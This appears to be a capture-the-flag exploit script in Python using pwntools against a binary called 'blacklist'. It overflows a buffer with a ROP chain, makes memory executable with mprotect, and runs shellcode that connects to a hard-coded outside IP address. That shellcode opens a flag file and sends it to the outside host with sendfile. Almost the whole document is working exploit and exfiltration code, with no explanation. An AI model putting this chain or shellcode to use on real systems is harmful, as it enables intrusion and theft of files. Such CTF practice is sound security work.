#!/usr/bin/env python2
from pwn import *
from time import sleep
from requests import get
from binascii import hexlify

exe = ELF("./blacklist")
context.binary = exe
context.terminal = "wt.exe -- wsl.exe -d Ubuntu-20.04 --".split()
context.log_level = "debug"

global io
breakpoints = '''
break *vuln+35
continue
'''

ip, port = "40.71.72.198", 1236

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(ip, port)
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)
    
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

ip = "129.146.172.34"
#ip = get('https://api.ipify.org').text
ip = ip.split(".")
ip.reverse()
hex_ip = ""

for i in ip:
    hex_ip += hexlify(chr(int(i)))

call_rax = 0x401014
pop_rsp = 0x402307
pop_rax = 0x414e53
pop_rdi = 0x4018ca
pop_rsi = 0x4028b8
pop_rdx = 0x4017cf
syscall = 0x426094

offset = 0x48
bss = exe.bss(0x100)
flag_path = "/home/fbi/flag.txt\x00"

payload = flat([
    "A"*offset,
    pop_rax, 0,
    pop_rdi, 0,
    pop_rsi, bss,
    pop_rdx, 0x1000,
    syscall,
    pop_rsp, bss+len(flag_path)
    ])

payload2 = flat([
    pop_rax, 10,
    pop_rdi, 0x4dd000,
    pop_rsi, 0x3000,
    pop_rdx, 0x7,
    syscall,
    pop_rax, bss+len(flag_path)+96,
    call_rax
    ])

shellcode = asm("""
    mov rax, 0x29
    mov rdi, 0x2
    mov rsi, 0x1
    xor rdx, rdx
    syscall

    mov rdi, rax
    mov rdx, 0x10
    movabs rax, 0x{}39050002
    push rax
    mov rsi, rsp
    mov rax, 0x2a
    syscall

    mov rbx, rax
    mov rax, 257
    mov rdi, 6
    mov rsi, {}
    xor rdx, rdx
    xor r10, r10
    syscall

    mov rsi, rax
    mov rax, 40
    mov rdi, rbx
    mov r10, 20
    syscall
    """.format(hex_ip,bss))

sl(payload)
sleep(1)
sl(flag_path+payload2+shellcode)
io.interactive()